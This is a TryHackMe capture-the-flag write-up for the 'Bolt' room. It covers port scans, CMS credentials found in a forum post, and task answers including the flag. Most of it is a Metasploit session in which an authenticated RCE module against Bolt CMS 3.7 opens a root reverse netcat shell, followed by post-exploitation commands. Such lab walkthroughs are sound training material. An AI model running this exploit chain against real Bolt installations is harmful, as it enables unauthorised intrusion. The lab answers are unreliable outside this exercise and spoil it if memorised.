# Bolt

<br/>

### NMAP SCAN

```
# Nmap 7.60 scan initiated Thu Jul 29 15:36:09 2021 as: nmap -sC -sV -oN nmap.txt 10.10.119.230
Nmap scan report for ip-10-10-119-230.eu-west-1.compute.internal (10.10.119.230)
Host is up (0.00071s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (EdDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    PHP 7.2.32-1
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Thu, 29 Jul 2021 14:36:24 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Thu, 29 Jul 2021 14:36:24 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 14360f
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Thu, 29 Jul 2021 14:36:24 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Thu, 29 Jul 2021 14:36:24 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: eeba0a
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Bolt | A hero is unleashed
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.60%I=7%D=7/29%Time=6102BCE8%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2029\x20Jul\x20
SF:2021\x2014:36:24\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP
SF:/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20pu
SF:blic,\x20s-maxage=600\r\nDate:\x20Thu,\x2029\x20Jul\x202021\x2014:36:24
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Toke
SF:n:\x20eeba0a\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\x20\
SF:x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"u
SF:tf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20
SF:content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\x20A
SF:\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x20<l
SF:ink\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Roboto
SF::400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.css\
SF:?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"styleshe
SF:et\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20\x20
SF:\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x20\x2
SF:0\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/\">\
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,16C3,"HTTP/1
SF:\.0\x20404\x20Not\x20Found\r\nDate:\x20Thu,\x2029\x20Jul\x202021\x2014:
SF:36:24\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-1
SF:\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20m
SF:ust-revalidate\r\nDate:\x20Thu,\x2029\x20Jul\x202021\x2014:36:24\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cache
SF:\r\nexpires:\x20-1\r\nX-Debug-Token:\x2014360f\r\n\r\n<!doctype\x20html
SF:>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial
SF:-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\
SF:.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/
SF:theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/them
SF:e\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x2
SF:0content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class=\"v
SF:is");
MAC Address: 02:E9:92:67:29:8F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 29 15:36:33 2021 -- 1 IP address (1 host up) scanned in 24.19 seconds

```
### Nikto Scan

```
- Nikto v2.1.5/2.1.5
+ Target Host: ip-10-10-119-230.eu-west-1.compute.internal
+ Target Port: 80
+ GET /: Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5aabc03f3631a 
+ GET /: The anti-clickjacking X-Frame-Options header is not present.
+ OPTIONS /: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ -3233: GET /icons/README: /icons/README: Apache default file found.
```


### Task 1: Deploy the machine

```
1. Start the machine.
Ans: No Answer Needed

```
<hr/>

### Task 2: Hack your way into the machine! 

```
1. What port number has a web server with a CMS running?
Ans: 8000

We can clearly see in Nmap scan that CMS running on port 8000

2. What is the username we can find in the CMS?
Ans: bolt

3. What is the password we can find for the username?
Ans: boltadmin123

Hey guys,

i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!

Regards,

Jake (Admin)

We can see password from bellow screenshot.

```

![Password Screenshot](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Bolt/Picture-2.jpg "Password Screenshot")

```
Lets Login to Bolt Admin.
Reading the Documentation We know that admin panal of this CMS is /bolt
Lets visit http://10.10.119.230:8000/bolt

Username: bolt
Password: boltadmin123

Lets Login bolt admin.

We can see bellow Screenshot

```

![Admin Login](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Bolt/Picture-3.jpg "Admin Login")


```
4. What version of the CMS is installed on the server? (Ex: Name 1.1.1)
Ans: Bolt3.7.1

We are successfully Authenticated with above Username and Password.
We can see Bolt CMS version in footer in bellow Screenshot.
```

![Bolt Version](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Bolt/Picture-4.jpg "Bolt Version")

```
5. There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
Ans: 48296

Lets Search Bolt Exploit in Search Engine.
We find exploit for bolt cms bellow is Screenshot.
We can see id in URL.

```

![Exploit](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Bolt/Picture-5.jpg "Exploit")

```
5. Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)

Note: If you can't find the exploit module its most likely because your metasploit isn't updated. Run `apt update` then `apt install metasploit-framework`

Ans: exploit/unix/webapp/bolt_authenticated_rce

Lets Open Metasploit and Search for bolt.

msf5 > search bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
   1  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution


Interact with a module by name or index, for example use 1 or use exploit/unix/webapp/bolt_authenticated_rce

msf5 > 

Note: Restarted Machine.

6. Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit
Ans: No Answer Needed.

7. Look for flag.txt inside the machine.
And: THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}

msf5 > use 1
[*] Using configured payload cmd/unix/reverse_netcat
msf5 exploit(unix/webapp/bolt_authenticated_rce) > show options

Module options (exploit/unix/webapp/bolt_authenticated_rce):

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from "/files" on the web server to "/root" on the server
   PASSWORD                                    yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                8000                   yes       The target port (TCP)
   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT              8080                   yes       The local port to listen on.
   SSL                  false                  no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use for this exploit (default is random)
   USERNAME                                    yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux (cmd)


msf5 exploit(unix/webapp/bolt_authenticated_rce) > 

msf5 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST 10.10.23.208
LHOST => 10.10.23.208
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set LPORT 4444
LPORT => 4444
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.75.78
RHOSTS => 10.10.75.78
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
msf5 exploit(unix/webapp/bolt_authenticated_rce) > run

[*] Started reverse TCP handler on 10.10.23.208:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "ixzlbd".
[*] Found 3 potential token(s) for creating .php files.
[+] Deleted file osoxjdhcnh.php.
[+] Deleted file algjqjpzpvne.php.
[+] Used token d87b06a46a0a6b2cd5f675a027 to create vhljfxfhgmgg.php.
[*] Attempting to execute the payload via "/files/vhljfxfhgmgg.php?ixzlbd=`payload`"
[*] Command shell session 1 opened (10.10.23.208:4444 -> 10.10.75.78:37272) at 2021-07-30 16:30:49 +0100
[!] No response, may have executed a blocking payload!
[+] Deleted file vhljfxfhgmgg.php.
[+] Reverted user profile back to original state.

id
uid=0(root) gid=0(root) groups=0(root)

ls
index.html
ls -la
total 16
drwxrwxrwx 2 501 staff 4096 Jul 30 15:30 .
drwxr-xr-x 7 501 staff 4096 Jul 18  2020 ..
-rw-r--r-- 1 501 staff  195 May  7  2020 .htaccess
-rw-r--r-- 1 501 staff    4 May  7  2020 index.html
pwd
/home/bolt/public/files
cd /home/bolt
ls -la
total 296
drwxr-xr-x 10 bolt bolt    4096 Jul 18  2020 .
drwxr-xr-x  3 root root    4096 Jul 18  2020 ..
drwxr-xr-x  5  501 staff   4096 Jul 18  2020 app
-rw-------  1 bolt bolt    1088 Jul 18  2020 .bash_history
-rw-r--r--  1 bolt bolt     220 Apr  4  2018 .bash_logout
-rw-r--r--  1 bolt bolt    3771 Apr  4  2018 .bashrc
-rw-r--r--  1  501 staff     53 May  7  2020 .bolt.yml
drwx------  2 bolt bolt    4096 Jul 18  2020 .cache
-rw-r--r--  1  501 staff    971 May  7  2020 composer.json
-rw-r--r--  1  501 staff 211038 May  7  2020 composer.lock
-rwxr-xr-x  1 root root      31 Jul 18  2020 cron
drwxr-xr-x  2  501 staff   4096 Jul 30 15:30 extensions
-rw-r--r--  1  501 staff    931 May  7  2020 .gitignore
drwx------  3 bolt bolt    4096 Jul 18  2020 .gnupg
-rw-r--r--  1  501 staff   3912 Aug 25  2018 index.php
drwxrwxr-x  3 bolt bolt    4096 Jul 18  2020 .local
-rw-r--r--  1 bolt bolt     807 Apr  4  2018 .profile
drwxr-xr-x  7  501 staff   4096 Jul 18  2020 public
-rw-r--r--  1  501 staff    345 Aug 25  2018 README.md
-rwxr-xr-x  1 root root      41 Jul 18  2020 reboot.sh
-rw-rw-r--  1 bolt bolt      66 Jul 18  2020 .selected_editor
drwxr-xr-x  3  501 staff   4096 Aug 25  2018 src
-rw-r--r--  1 bolt bolt       0 Jul 18  2020 .sudo_as_admin_successful
drwxr-xr-x 36  501 staff   4096 Jul 18  2020 vendor
shell
[*] Trying to find binary(python) on target machine
[*] Found python at 
[*] Using `python` to pop up an interactive shell


ls
app
composer.json
composer.lock
cron
extensions
index.php
public
README.md
reboot.sh
src
vendor
locate flag
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
locate flag.txt 

ls
app
composer.json
composer.lock
cron
extensions
index.php
public
README.md
reboot.sh
src
vendor


find / -name flag.txt -type f 2>/dev/null
/home/flag.txt
cat /home/flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}

```




